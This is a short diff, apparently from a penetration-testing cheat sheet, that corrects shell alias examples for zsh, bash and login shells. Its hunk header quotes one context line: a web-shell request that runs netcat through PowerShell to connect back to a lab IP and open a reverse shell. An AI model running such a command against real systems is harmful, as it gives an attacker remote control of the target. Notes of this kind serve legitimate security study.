@@ -78,20 +78,20 @@ cmd.php?cmd=powershell.exe -c "c:\xampp\htdocs\nc.exe 192.168.49.58 45443 -e 'cm
 #### Create a Command Alias
 Zsh
 ```bash
-echo "alias cls='cls'" >> .zshrc # just me
-echo "alias cls='cls'" >> /etc/zsh/zshrc # for all users
+echo "alias cls='clear'" >> .zshrc # just me
+echo "alias cls='clear'" >> /etc/zsh/zshrc # for all users
 ```
 
 BASH
 ```bash
-echo "alias cls='cls'" >> .bash_aliases # just me
-echo "alias cls='cls'" >> /etc/bash.bashrc # for all users
+echo "alias cls='clear'" >> .bash_aliases # just me
+echo "alias cls='clear'" >> /etc/bash.bashrc # for all users
 ```
 
 **Login Shells (the GUI)**
 ```bash
-echo "alias cls='cls'" >> .profile # just me
-echo "alias cls='cls'" >> /etc/profile # for all users
+echo "alias cls='clear'" >> .profile # just me
+echo "alias cls='clear'" >> /etc/profile # for all users
 ```
 
 #### Environment Variables
